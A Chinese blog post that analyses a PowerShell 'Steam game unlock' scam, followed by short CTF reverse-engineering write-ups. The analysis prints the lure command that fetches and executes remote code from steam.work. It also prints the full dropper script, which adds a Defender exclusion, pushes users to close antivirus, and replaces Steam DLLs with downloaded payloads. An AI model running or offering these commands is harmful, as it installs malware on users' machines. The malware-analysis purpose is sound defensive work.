# Steam一键解锁游戏骗局分析

义修队接的单，steam通过powershell解锁游戏，感觉不简单

![image-20240710211826674](../../../blog/source/pic/image-20240710211826674.png)

```powershell
irm steam.work | iex
```

1.`irm` 是 `Invoke-RestMethod` 的缩写，它用于发送 HTTP GET 请求到指定的 URL，这里是 `steam.work`。这个命令将尝试从该 URL 下载数据。

2.`|` 是管道符号，它会将前一个命令的输出作为下一个命令的输入。

3.`iex` 是 `Invoke-Expression` 的缩写。此命令将执行通过管道传递来的数据作为 PowerShell 脚本代码。

### 查看回显

1.**保存脚本到变量**:

```powershell
$scriptContent = irm steam.work
```

2.**查看脚本内容**:

```powershell
$scriptContent
```

通过这种方式，可以看到从 `steam.work` 返回的数据，而***不会执行***它。

返回了一个html文件，分析后发现是steam商城的默认页面

推测为检测UA头，只有powershell创建的web服务才能触发

![image-20240710211844448](../../../blog/source/pic/image-20240710211844448.png)

1. **powerShell**命令（ctrl+f搜到的）：

–      irm steam.work/pwsDwFile/new -OutFile x.ps1：这个命令使用Invoke-RestMethod（irm）从steam.work/pwsDwFile/new下载文件，并将其保存为名为x.ps1的PowerShell脚本文件。

–      powershell.exe -ExecutionPolicy Bypass -File x.ps1：此命令执行上一步保存的x.ps1脚本，同时绕过执行策略，允许运行未签名的脚本。

这种组合表明，目的是从一个可能未知或不受信任的源下载并执行PowerShell脚本

这个PowerShell脚本似乎在自动化与Steam和360安全软件相关的几个任务。以下是脚本的详细解释：

1. **下载并保存脚本：**
   ```powershell
   Invoke-RestMethod -Uri "http://steam.work/pwsDwFile/new" -OutFile "C:\PathToFolder\x.ps1"
   ```
   这段代码从指定的URL下载文件，并将其保存到指定路径。

2. **删除特定文件：**
   ```powershell
   $filePathToDelete = Join-Path $env:USERPROFILE "x.ps1"
   if (Test-Path $filePathToDelete) {
       Remove-Item -Path $filePathToDelete
   }
   $desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "x.ps1"
   if (Test-Path $desktopFilePathToDelete) {
       Remove-Item -Path $desktopFilePathToDelete
   }
   ```
   这段代码删除用户主目录和桌面上的名为`x.ps1`的文件。

3. **检查Steam安装路径：**
   ```powershell
   $steamRegPath = 'HKCU:\Software\Valve\Steam'
   $localPath = -join ($env:LOCALAPPDATA,"\SteamActive")
   if ((Test-Path $steamRegPath)) {
       $properties = Get-ItemProperty -Path $steamRegPath
       if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
           $steamPath = $properties.SteamPath
       }
   }
   ```
   这段代码检查注册表以获取Steam的安装路径，并设置一个本地路径。

4. **检查管理员权限：**
   ```powershell
   if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
       Write-Host "[请重新打开Power shell 打开方式以管理员身份运行]" -ForegroundColor:red
       exit
   }
   ```
   这段代码检查当前脚本是否以管理员身份运行，如果不是则提示用户以管理员身份运行。

5. **定义PwStart函数：**
   ```powershell
   function PwStart() {
       if(Get-Process "360Tray*" -ErrorAction Stop){
           while(Get-Process 360Tray* -ErrorAction Stop){
               Write-Host "[请先退出360安全卫士]" -ForegroundColor:Red
               Start-Sleep 1.5
           }
           PwStart
       }
       if(Get-Process "360sd*" -ErrorAction Stop)
       {
           while(Get-Process 360sd* -ErrorAction Stop){
               Write-Host "[请先退出360杀毒]" -ForegroundColor:Red
               Start-Sleep 1.5
           }
           PwStart
       }
   
       if ($steamPath -eq ""){
           Write-Host "[请检查您的Steam是否正确安装]" -ForegroundColor:Red
           exit
       }
       Write-Host "[ServerStart    OK]" -ForegroundColor:green
       Stop-Process -Name steam* -Force -ErrorAction Stop
       Start-Sleep 2
       if(Get-Process steam* -ErrorAction Stop){
           TASKKILL /F /IM "steam.exe" | Out-Null
           Start-Sleep 2
       }
   
       if (!(Test-Path $localPath)) {
           md $localPath | Out-Null
           if (!(Test-Path $localPath)) {
               New-Item $localPath -ItemType directory -Force | Out-Null
           }
       }
   
       $catchPath = -join ($steamPath,"\package\data")
       if ((Test-Path $catchPath)) {
           if ((Test-Path $catchPath)) {
               Remove-Item $catchPath -Recurse -Force | Out-Null
           }
       }
   
       try{
           Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
           Start-Sleep 3
       }catch{}
   
       Write-Host "[Result->0     OK]" -ForegroundColor:green
   
       try{
           $d = $steamPath + "/version.dll"
           if (Test-Path $d) {
               Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null
           }
           $d = $steamPath + "/user32.dll"
           if (Test-Path $d) {
               Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null
           }
           $d = $steamPath + "/steam.cfg"
           if (Test-Path $d) {
               Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null
           }
           $d = $steamPath + "/hid.dll"
           if (Test-Path $d) {
               Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null
           }
       }catch{
           Write-Host "[异常残留请检查[$d]文件是否异常!]" -ForegroundColor:red
           exit
       }
   
       $downloadData = "http://steam.work/pwsDwFile/bcfc1e52ca77ad82122dfe4c9560f3ec.pdf"
       $downloadLink = "http://steam.work/pwsDwFile/9b96dac2bb0ba18d56068fabc5b17185.pdf"
   
       irm -Uri $downloadLink -OutFile $d -ErrorAction Stop
       Write-Host "[Result->1     OK]" -ForegroundColor:green
       $d = $localPath + "/hid"
       irm -Uri $downloadData -OutFile $d -ErrorAction Stop
       Write-Host "[Result->2     OK]" -ForegroundColor:green
   
       Start-Sleep 1
   
       Start steam://
       Write-Host "[连接服务器成功请在Steam输入激活码 3秒后自动关闭]" -ForegroundColor:green
       Start-Sleep 3
   
       $processID = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
       Stop-Process -Id $processID.ParentProcessId -Force
       exit
   }
   ```
   这个函数`PwStart`执行了以下任务：
   - 检查并终止360安全卫士和360杀毒进程。
   - 确认Steam安装路径是否存在。
   - 停止所有Steam相关进程。
   - 创建本地目录（如果不存在）。
   - 删除特定Steam缓存数据。
   - 添加Steam路径到Windows Defender的排除路径。
   - 删除特定Steam文件。
   - 下载并保存指定文件到本地路径，下载的文件包括“version.dll”、“user32.dll”、“steam.cfg”和“hid.dll”。
   - 启动Steam并提示用户输入激活码。

整个脚本的目的是确保系统中没有运行360安全软件的情况下，清理和重置Steam的相关数据，并通过自动化下载和配置来恢复Steam的运行。

https://www.cnblogs.com/0day-li/p/18042274

https://github.com/BlueAmulet/GreenLuma-2024-Manager

原理应该类似于家庭共享，实现假入库。



看看释放了什么，在虚拟机输入链接，在everything中监听

![image-20240627102012903](https://s2.loli.net/2024/06/27/EGHsdRAkrzOge3j.png)

打开链接，释放了hid和**hid.dll**

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/1d7da3e7683c8101d21149a7aaab4ed0221cfbda7dc20c7e995731d4b8d13a65)

![image-20240627102633077](https://s2.loli.net/2024/06/27/ColRYyurmaiFfdH.png)

分析了下签名，怀疑惯犯

![image-20240627103250972](https://s2.loli.net/2024/06/27/kptnQvR2LaAWHxm.png)

[近期 Higaisa（黑格莎） APT 针对中国用户的钓鱼网站、样本分析(一) | CTF导航 (ctfiot.com)](https://www.ctfiot.com/144523.html)

逆向分析hid.dll，拖入ida

查看字符串，发现

![image-20240627102146473](https://s2.loli.net/2024/06/27/rFB2IPhQHo9qsAN.png)

Mark Adler不是那个开发zlib的吗
![image-20240627102256393](https://s2.loli.net/2024/06/27/8OR3JABzLqsS1tj.png)

基本确认了，存在zlib加密，分析hid文件

先写个脚本解密

```python
import zlib

def decompress_zlib_file(file_path, output_path):
    try:
        with open(file_path, 'rb') as file:
            compressed_data = file.read()
        
        decompressed_data = zlib.decompress(compressed_data)
        
        with open(output_path, 'wb') as output_file:
            output_file.write(decompressed_data)
        
        print(f"Decompressed data written to {output_path}")
        return True
    except (zlib.error, IOError) as e:
        print(f"Error decompressing file: {e}")
        return False

input_file_path = r"C:\Users\23038\Desktop\hid.zlib"
output_file_path = r"C:\Users\23038\Desktop\decompressed_pe.dll"

success = decompress_zlib_file(input_file_path, output_file_path)

if success:
    print("Decompression and file writing successful.")
else:
    print("Failed to decompress and write the file.")def decompress_zlib_file(file_path, output_path):

```

分析decompressed_pe.dll，先拖入沙箱

[360沙箱云](https://ata.360.net/report/580190474312704)

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/e6a3196eff236cadacbaf42285d31d59cb74889882a1f269ebcc88c26728aa52)

不出所料，报毒

![](https://s2.loli.net/2024/06/27/DJKBQ537zHUe48P.png)

![image-20240627103106412](https://s2.loli.net/2024/06/27/OxPfKrCjgSLGs7V.png)

加壳了，exeinfo扫不出来，换peid扫出来

![image-20240627102919993](https://s2.loli.net/2024/06/27/R96JGqvN1ZCisuz.png)

现在很多软件加壳之后，你用查壳软件一查，都显示yoda壳
打开peid的userdb.txt,里面查找一下yoda的特征码,发现居然从头到尾都是问号,看来这数据库将识别不到的都归为yoda了

不知道是什么壳不敢分析了，等考完试找个虚拟机环境看看





# CISCN 16决赛 RE

## babyRE

一个XML文件，打开

![image-20240710161428190](../../../blog/source/pic/image-20240710161428190.png)

Snap！百度一下，发现是个示教编程网站，点进去看看

![image-20240710161507367](../../../blog/source/pic/image-20240710161507367.png)

示教编程就很舒服了，直接把secret打印出来，![image-20240710161553669](../../../blog/source/pic/image-20240710161553669.png)打开js扩展。

重新异或一下解密就可以了

```python
t1 = [102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]

print(len(t1))

for i in range(1,len(t1)):

  t1[i] = t1[i] ^ t1[i-1]



for i in range(len(t1)):   

  print(chr(t1[i]),end = "")
```

得到flag flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}



# IChunqiu 可信计算专项训练 

## biba

find / -name *flag* 2> /dev/null

/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/root/cube-shell/plugin/libflag_output.so
/root/cube-shell/plugin/flag_output.cfg
/root/cube-shell/define/flag_verify.json
/root/cube-shell/include/flag_verify.h
/root/cube-shell/src/flag_output
/root/cube-shell/src/flag_output/flag_output.cfg
/root/cube-shell/src/flag_output/flag_output.c
/root/cube-shell/src/flag_output/flag_output.h
/root/cube-shell/src/flag_output/flag_output.o
/root/cube-shell/instance/flag_server
/root/cube-shell/instance/flag_server/flag.list
/root/cube-shell/instance/flag_server/.flag.list.swp
/root/centoscloud/cube-1.3/proc/main/base_define/baseflag.json
/root/centoscloud/cube-1.3/cubelib/memdb/baseflag.json
/root/centoscloud/cube-1.3/cubelib/struct_mod/enum_flag_ops.o
/root/centoscloud/cube-1.3/cubelib/struct_mod/enum_flag_ops.c
/root/centoscloud/cube-1.3/example/AliceBob/instance/transfer/flag.txt

一个一看，看哪一个可疑

直接cat /root/cube-shell/instance/flag_server/flag.list

![img](../../../blog/source/pic/cf65da73ce9c4db7bdec0e296c13a35a.png)

flag{82873f14170c48a8b3503c0}



